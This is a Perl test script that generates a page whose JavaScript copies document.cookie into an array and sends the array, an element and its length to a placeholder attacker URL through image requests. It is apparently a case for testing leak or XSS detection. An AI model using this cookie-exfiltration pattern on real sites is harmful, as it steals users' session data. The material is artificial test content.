#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Tests arrays";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">

		var reportdut = "";
		
		// gets the number of arguments and add it to the reporting
		// variable "reportdut"
		
		var mycookie = $evil;

		var arr = [1, 2];

		arr[0] = mycookie;
		
//		alert("arr = " + arr);
//		alert("arr0 = " + arr[0]);
//		alert("arr1 = " + arr[1]);
//		alert("arr.length = " + arr.length);

		var url = "$imgevilurl?normal=" + arr;
		document.images[0].src = url;
		
		var url2 = "$imgevilurl?normal=" + arr[0];
		document.images[1].src = url2;
		
		var url3 = "$imgevilurl?normal=" + arr[1];
		document.images[2].src = "$imgevilurl?normal=len_" + arr.length;
		
    </script>
|;

require "xss_basic_footer.pl";
